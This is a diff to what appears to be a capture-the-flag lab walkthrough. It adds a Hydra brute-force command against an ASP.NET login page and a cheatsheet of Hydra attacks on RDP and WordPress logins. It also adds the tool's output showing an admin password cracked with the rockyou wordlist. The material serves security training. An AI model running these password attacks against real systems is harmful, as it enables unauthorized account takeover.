@@ -113,16 +113,32 @@ Mini hydra cheatsheet:
 | hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>                                                                                                | Attack a Windows Remote Desktop with a password <br/>list.                                                                                                                        |
 | hydra -l <username> -P .<password list> $ip -V http-form-post '/wp-login.php:<br/>log=^USER^&pwd=^PASS^&wp-submit=<br/>Log In&testcookie=1:S=Location' | Craft a more specific request for Hydra <br/>to brute force.                                                                                                                      |
 
-Using the flags:
+Using:
 
 * `-f` to stop the attack when a valid password is found
 * `-l` to specify the username for the bruteforce attack
 * `-P` to specify the wordlist to use for the bruteforce
-* `http-post-form` to specify the URL including all parameters used in the request, such as the username, password and the failed authentication message
+* UserName=`^USER^`
+* Password=`^PASS^`
+* Wordlist for passwords = `/usr/share/wordlists/rockyou.txt`
+* IP of the target server = `10.10.39.227`
+* Type of attack = `http-post-form`
+* Page to attack = `/Account/login.aspx`
+* Session info gathered from Burp = `__VIEWSTATE=HyDAVJBUzaoWbePyeU7aJWUKLoIeSNhkpLwoKuSJYYorT2mFK5gG3zW4y%2Faa0Nv60arFkTV0uFNS8cU8Zrhf3QFwm4LeDyJVKQOfqh0GHwiKFm0NU%2BBahqGt9szkQqO6inS92zNkiQ2x6usDxT9Zumz3go6vwo3AfOWIfRNuJeYa%2FsbQ&__EVENTVALIDATION=lSQI5ypG9I3szy4G87w98h3YF4IR%2FNhNTjz1YjdKlGwjWuzNrGbLTR%2Bm%2FHYM84xxxticrZc8pgZrywRT5QrN2kYdTOWNlu0Iw%2FUYZclfGLWghmvGeRx4rfh5oYC8QbeVh60uXYY0FpdFSJGJY4D56nvCYUwXjUfl4QlydaPXqAKiNcb9&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=admin&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in`
+* Adding a Failed login message so we can detect when we have a success = `:Login Failed`
 
-First attempt:
+```text
+# hydra -f -l admin -P /usr/share/wordlists/rockyou.txt 10.10.39.227 http-post-form "/Account/login.aspx:__VIEWSTATE=HyDAVJBUzaoWbePyeU7aJWUKLoIeSNhkpLwoKuSJYYorT2mFK5gG3zW4y%2Faa0Nv60arFkTV0uFNS8cU8Zrhf3QFwm4LeDyJVKQOfqh0GHwiKFm0NU%2BBahqGt9szkQqO6inS92zNkiQ2x6usDxT9Zumz3go6vwo3AfOWIfRNuJeYa%2FsbQ&__EVENTVALIDATION=lSQI5ypG9I3szy4G87w98h3YF4IR%2FNhNTjz1YjdKlGwjWuzNrGbLTR%2Bm%2FHYM84xxxticrZc8pgZrywRT5QrN2kYdTOWNlu0Iw%2FUYZclfGLWghmvGeRx4rfh5oYC8QbeVh60uXYY0FpdFSJGJY4D56nvCYUwXjUfl4QlydaPXqAKiNcb9&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
-    # hydra -f -l admin -P /usr/share/wordlists/rockyou.txt <IP address target machine> http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=nbWrkCqQ%2B1Hn%2Fgt8OwrXb%2B%2BFMX0bVJv9xbWiO3oASE6l0%2BDl73MXEP2ao2pwbsK6Jr4MzOI9cbeVU7o5WL%2BFKDPWl1RXjt5kLGmi%2F1d9biM%2Fi3jThbmDihH1A7JWIVyWFQ3lIXAOLpqdlBKHFv6dZd8XzdjcN%2FrgmGzhog7Sf0Ml3kvolr3pzU9VlhHtBqJZNJ%2FkQVxtOT%2Bc%2FxMceQklmwd%2FeiI1sb4%2B4Mv4ol44Uy4Mf9Vaw%2B6OUiBt1BZn8PQoOcFS6ul97keSrPf2jTIqUqeC1YQwwE0FU7Syl8jfviP6nsNb4aSX6ASTDZlajXjkTtFum%2Bpk3uz4%2FtNoraPjA%2FTn5DuX56Sbr4I9oGPQznIuhjc0&__EVENTVALIDATION=pKMn8W0WIp7BuOhOq9YO49%2BqkAVDl1TJjXzk%2BDzHnOyizFWE7BYkR%2Frn983R5edqA0yBYDn%2Fi7BIxrq%2FJlxoiMHPZ2UN1iFWs83YOrgnVHxJtr4R811S4kAhpj4kb6aqZ1r9F5iqUqIoj3gfQjf%2BtO7mRTdLARthnldxPEA73U3caeMM&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=admin&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-30 05:11:49
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://10.10.39.227:80/Account/login.aspx:__VIEWSTATE=HyDAVJBUzaoWbePyeU7aJWUKLoIeSNhkpLwoKuSJYYorT2mFK5gG3zW4y%2Faa0Nv60arFkTV0uFNS8cU8Zrhf3QFwm4LeDyJVKQOfqh0GHwiKFm0NU%2BBahqGt9szkQqO6inS92zNkiQ2x6usDxT9Zumz3go6vwo3AfOWIfRNuJeYa%2FsbQ&__EVENTVALIDATION=lSQI5ypG9I3szy4G87w98h3YF4IR%2FNhNTjz1YjdKlGwjWuzNrGbLTR%2Bm%2FHYM84xxxticrZc8pgZrywRT5QrN2kYdTOWNlu0Iw%2FUYZclfGLWghmvGeRx4rfh5oYC8QbeVh60uXYY0FpdFSJGJY4D56nvCYUwXjUfl4QlydaPXqAKiNcb9&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed
+[80][http-post-form] host: 10.10.39.227   login: admin   password: 1qaz2wsx
+[STATUS] attack finished for 10.10.39.227 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-30 05:12:42
+```
 
 ## Compromise the machine 
 
